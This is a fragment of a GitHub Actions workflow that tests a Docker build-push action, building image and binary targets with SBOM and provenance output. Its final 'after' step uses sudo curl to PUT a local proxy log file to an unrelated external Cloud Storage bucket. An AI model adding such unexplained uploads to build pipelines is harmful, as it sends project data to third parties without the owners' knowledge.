    - continue-on-error: true
      name: Checkout
      uses: actions/checkout@v3
    - continue-on-error: true
      name: Set up Docker Buildx
      uses: docker/setup-buildx-action@v2
      with:
        driver-opts: 'network=host

          image=${{ inputs.buildkit-image || env.BUILDKIT_IMAGE }}

          '
        version: ${{ inputs.buildx-version || env.BUILDX_VERSION }}
    - continue-on-error: true
      name: Build
      uses: ./
      with:
        cache-from: type=gha,scope=attests-${{ matrix.target }}
        cache-to: type=gha,scope=attests-${{ matrix.target }},mode=max
        context: ./test/go
        file: ./test/go/Dockerfile
        outputs: ${{ matrix.output }}
        sbom: true
        target: ${{ matrix.target }}
    - continue-on-error: true
      if: matrix.target == 'image'
      name: Inspect image
      run: 'docker buildx imagetools inspect localhost:5000/name/app:latest --format
        ''{{json .}}''

        '
    - continue-on-error: true
      if: matrix.target == 'binary'
      name: Check output folder
      run: 'tree /tmp/buildx-build

        '
    - continue-on-error: true
      if: matrix.target == 'binary'
      name: Print provenance
      run: 'cat /tmp/buildx-build/provenance.json | jq

        '
    - continue-on-error: true
      if: matrix.target == 'binary'
      name: Print SBOM
      run: 'cat /tmp/buildx-build/sbom.spdx.json | jq

        '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/solarmonkey/build-push-action.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        include:
        - output: type=image,name=localhost:5000/name/app:latest,push=true
          target: image
        - output: /tmp/buildx-build
          target: binary
